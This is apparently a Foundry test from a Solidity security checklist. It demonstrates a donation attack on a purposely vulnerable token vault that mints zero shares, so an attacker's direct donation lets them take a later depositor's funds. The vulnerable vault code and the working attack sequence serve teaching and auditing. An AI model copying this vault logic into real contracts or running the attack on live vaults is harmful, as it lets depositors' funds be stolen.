// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * Overview:
 * Checklist Item ID: SOL-AM-DA-1
 *
 * This test demonstrates a donation attack on a token vault.
 * The attacker deposits a minimal amount first, then donates tokens to inflate the vault's balance,
 * significantly reducing the share value for subsequent depositors.
 * When the attacker withdraws, they'll receive much more than they initially deposited,
 * showing a clear economic benefit from the attack.
 */

// Custom token for testing with mint function
contract TestToken is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract TokenVault {
    IERC20 public token;
    mapping(address => uint256) public shares;
    uint256 public totalSupply;

    constructor(IERC20 _token) {
        token = _token;
    }

    function deposit(uint256 _amount) external {
        uint256 tokenBalance = token.balanceOf(address(this));
        uint256 shareAmount = 0;

        if (totalSupply == 0) {
            shareAmount = _amount;
        } else {
            shareAmount = _amount * totalSupply / tokenBalance;
        }

        // Allow zero share minting
        shares[msg.sender] = shares[msg.sender] + shareAmount;
        totalSupply = totalSupply + shareAmount;
        token.transferFrom(msg.sender, address(this), _amount);
    }

    function withdraw(uint256 _amount) external {
        uint256 shareAmount = _amount;
        require(shares[msg.sender] >= shareAmount, "Insufficient shares");

        uint256 tokenBalance = token.balanceOf(address(this));
        uint256 amountToWithdraw = shareAmount * tokenBalance / totalSupply;

        shares[msg.sender] = shares[msg.sender] - shareAmount;
        totalSupply = totalSupply - shareAmount;
        token.transfer(msg.sender, amountToWithdraw);
    }
}

contract DonationAttackTest is Test {
    TokenVault public vault;
    TestToken public token;
    address attacker = address(1);
    address victim = address(2);

    // Initial attacker tokens
    uint256 constant ATTACKER_INITIAL_TOKENS = 10000;
    // Small amount to initially deposit
    uint256 constant ATTACKER_INITIAL_DEPOSIT = 1;
    // Large amount to donate directly
    uint256 constant ATTACKER_DONATION = 9999;
    // Victim deposit amount
    uint256 constant VICTIM_DEPOSIT = 1000;

    function setUp() public {
        token = new TestToken("Test Token", "TT");
        vault = new TokenVault(IERC20(address(token)));

        // Mint tokens for users
        token.mint(attacker, ATTACKER_INITIAL_TOKENS);
        token.mint(victim, VICTIM_DEPOSIT);

        // Approve vault to spend tokens
        vm.prank(attacker);
        token.approve(address(vault), type(uint256).max);

        vm.prank(victim);
        token.approve(address(vault), type(uint256).max);
    }

    function testDonationAttack() public {
        // ---- Step 1: Attacker deposits minimal amount ----
        console.log("INITIAL STATE:");
        console.log("Attacker token balance:", token.balanceOf(attacker));

        vm.startPrank(attacker);
        vault.deposit(ATTACKER_INITIAL_DEPOSIT);
        console.log("Attacker deposits:", ATTACKER_INITIAL_DEPOSIT);
        console.log("Attacker shares:", vault.shares(attacker));

        // Validate initial deposit
        assertEq(vault.shares(attacker), ATTACKER_INITIAL_DEPOSIT);
        assertEq(vault.totalSupply(), ATTACKER_INITIAL_DEPOSIT);
        assertEq(token.balanceOf(address(vault)), ATTACKER_INITIAL_DEPOSIT);

        // ---- Step 2: Attacker donates to inflate share price ----
        token.transfer(address(vault), ATTACKER_DONATION);
        vm.stopPrank();

        console.log("\nAFTER DONATION:");
        console.log("Vault token balance:", token.balanceOf(address(vault)));

        // Vault now has 10000 tokens (1 + 9999)
        assertEq(token.balanceOf(address(vault)), ATTACKER_INITIAL_TOKENS);

        // ---- Step 3: Victim deposits and gets almost no shares ----
        vm.prank(victim);
        vault.deposit(VICTIM_DEPOSIT);

        uint256 victimShares = vault.shares(victim);
        console.log("\nVICTIM DEPOSITS:");
        console.log("Victim deposits:", VICTIM_DEPOSIT);
        console.log("Victim shares:", victimShares);

        // Total tokens in vault
        console.log("Total tokens in vault:", token.balanceOf(address(vault)));

        // ---- Step 4: Attacker withdraws and gets profit ----
        vm.prank(attacker);
        vault.withdraw(ATTACKER_INITIAL_DEPOSIT);

        uint256 attackerFinalBalance = token.balanceOf(attacker);
        console.log("\nATTACKER WITHDRAWS:");
        console.log("Attacker initial deposit:", ATTACKER_INITIAL_DEPOSIT);
        console.log("Attacker final balance after withdrawal:", attackerFinalBalance);

        // Since the attacker has 1 share out of 1 total shares (victim got 0),
        // they should get all of the vault's balance including the victim's deposit
        // (1 + 9999 + 1000) = 11000 tokens
        // Which is much more than their initial 1 token deposit
        assertTrue(attackerFinalBalance > ATTACKER_INITIAL_TOKENS);

        // Calculate profit from the attack
        uint256 profit = attackerFinalBalance - ATTACKER_INITIAL_TOKENS;
        console.log("Attacker profit:", profit);

    }
}